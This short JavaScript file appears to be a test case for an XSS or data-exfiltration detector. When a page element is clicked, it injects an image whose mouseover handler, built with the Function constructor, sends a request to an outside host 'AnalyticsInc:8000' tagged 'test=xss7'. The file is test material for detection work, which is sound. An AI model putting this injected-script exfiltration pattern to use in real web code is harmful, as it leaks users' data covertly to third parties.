// exfil_test_xss7.js
function exfiltrate_key_history() {
  var script = document.createElement("img");
  script.src = "#";
  var v0 = script;
  var v4 = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss7",true);xmlhttp.send(null);']);
  JAM.set(v0, "onmouseover", v4);
  script.height = "50";
  script.width = "50";
  script.alt = "image";
  var v1 = document.getElementsByTagName("body")[0];
  JAM.call(v1.appendChild, v1, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

